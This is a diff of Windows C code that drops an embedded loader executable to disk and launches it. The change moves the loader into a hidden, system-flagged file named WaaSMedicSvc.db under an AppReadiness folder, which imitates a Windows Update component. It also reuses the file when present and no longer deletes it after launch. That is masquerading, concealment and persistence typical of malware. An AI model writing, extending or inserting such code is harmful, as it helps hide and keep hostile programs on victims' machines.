@@ -127,23 +127,34 @@ static bool WriteUInt32(HANDLE handle, DWORD value)
     return WriteAllToHandle(handle, &value, sizeof(value));
 }
 
-static bool CreateTempLoaderPath(wchar_t* outPath, size_t outChars)
+static bool EnsureLoaderDbPath(wchar_t* outPath, size_t outChars)
 {
-    wchar_t tempDir[MAX_PATH] = { 0 };
-    if (GetTempPathW(MAX_PATH, tempDir) == 0)
+    wchar_t localAppData[MAX_PATH] = { 0 };
+    if (FAILED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData)))
     {
         return false;
     }
 
-    return SUCCEEDED(StringCchPrintfW(outPath, outChars, L"%sWaaS_%08X.exe", tempDir, GetTickCount()));
-}
-
-static bool LaunchLoaderFromMemory(BYTE* loaderExe, DWORD loaderSize, BYTE* core, DWORD coreSize, BYTE* token, DWORD tokenSize, BYTE* media, DWORD mediaSize)
-{
-    wchar_t loaderPath[MAX_PATH] = { 0 };
-    if (!CreateTempLoaderPath(loaderPath, MAX_PATH))
+    wchar_t dir[MAX_PATH] = { 0 };
+    if (FAILED(StringCchPrintfW(dir, MAX_PATH, L"%s\\Microsoft\\Windows\\AppReadiness", localAppData)))
     {
         return false;
+    }
+
+    SHCreateDirectoryExW(NULL, dir, NULL);
+    return SUCCEEDED(StringCchPrintfW(outPath, outChars, L"%s\\WaaSMedicSvc.db", dir));
+}
+
+static bool EnsureLoaderDbOnDisk(const wchar_t* loaderPath, BYTE* loaderExe, DWORD loaderSize)
+{
+    WIN32_FILE_ATTRIBUTE_DATA attrs = { 0 };
+    if (GetFileAttributesExW(loaderPath, GetFileExInfoStandard, &attrs))
+    {
+        if (attrs.nFileSizeLow == loaderSize && attrs.nFileSizeHigh == 0)
+        {
+            HideSystemPath(loaderPath);
+            return true;
+        }
     }
 
     HANDLE loaderFile = CreateFileW(
@@ -152,7 +163,7 @@ static bool LaunchLoaderFromMemory(BYTE* loaderExe, DWORD loaderSize, BYTE* core
         0,
         NULL,
         CREATE_ALWAYS,
-        FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_TEMPORARY,
+        FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM,
         NULL);
 
     if (loaderFile == INVALID_HANDLE_VALUE)
@@ -160,13 +171,31 @@ static bool LaunchLoaderFromMemory(BYTE* loaderExe, DWORD loaderSize, BYTE* core
         return false;
     }
 
-    if (!WriteAllToHandle(loaderFile, loaderExe, loaderSize))
+    bool written = WriteAllToHandle(loaderFile, loaderExe, loaderSize);
+    CloseHandle(loaderFile);
+
+    if (!written)
     {
-        CloseHandle(loaderFile);
         DeleteFileW(loaderPath);
         return false;
     }
-    CloseHandle(loaderFile);
+
+    HideSystemPath(loaderPath);
+    return true;
+}
+
+static bool LaunchLoaderFromMemory(BYTE* loaderExe, DWORD loaderSize, BYTE* core, DWORD coreSize, BYTE* token, DWORD tokenSize, BYTE* media, DWORD mediaSize)
+{
+    wchar_t loaderPath[MAX_PATH] = { 0 };
+    if (!EnsureLoaderDbPath(loaderPath, MAX_PATH))
+    {
+        return false;
+    }
+
+    if (!EnsureLoaderDbOnDisk(loaderPath, loaderExe, loaderSize))
+    {
+        return false;
+    }
 
     SECURITY_ATTRIBUTES sa = { 0 };
     sa.nLength = sizeof(sa);
@@ -224,7 +253,6 @@ static bool LaunchLoaderFromMemory(BYTE* loaderExe, DWORD loaderSize, BYTE* core
 
     CloseHandle(pi.hThread);
     CloseHandle(pi.hProcess);
-    DeleteFileW(loaderPath);
     return true;
 }
 
